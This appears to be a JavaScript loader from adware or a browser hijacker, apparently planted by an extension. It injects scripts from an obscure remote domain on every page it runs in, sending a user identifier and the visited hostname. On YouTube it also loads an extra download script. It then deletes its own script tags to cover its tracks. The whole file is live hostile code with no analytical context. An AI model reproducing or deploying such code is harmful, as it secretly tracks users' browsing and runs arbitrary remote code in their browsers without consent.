void function(){if(window.self!==window.top)return;var pid='coi1634',uid='016133bb-62c5-43d0-bd59-68e9b10c2567',osid='7132',ts=1486995992888,h=0,aff=1,appid='coi1634-7132-1486995992888-016133bb-62c5-43d0-bd59-68e9b10c2567';var extadActive = 1;//(Date.now() - ts > 7200000) ? 1 : 0;
inject('//msmdzbsyrw.org/app/noext/main.php?pid=' + pid + '&eid=2&uid=' + uid + '&host=' + location.hostname + '&active=' + extadActive + '&extad_init=' + (window.EXTADinit ? 1 : 0)+'&h='+h+'&ts='+ts+'&aff='+aff+'&appid='+appid);
location.hostname === 'www.youtube.com' && inject('https://www.u-bar.org/js/download.js');
removeSelf();
function removeSelf() {
  var scr=document.getElementById('ubar-loader')||document.getElementById('videoplugin-loader');
  scr&&tryToRemove(scr);
}
function inject(src){
  var scr=document.createElement('script');
  scr.src=src;
  scr.onload=scr.onerror=function(){setTimeout(function(){tryToRemove(scr)},0)};
  document.body.appendChild(scr);
}
function tryToRemove(node){try{node.parentNode.removeChild(node)}catch(ex){}}
}();
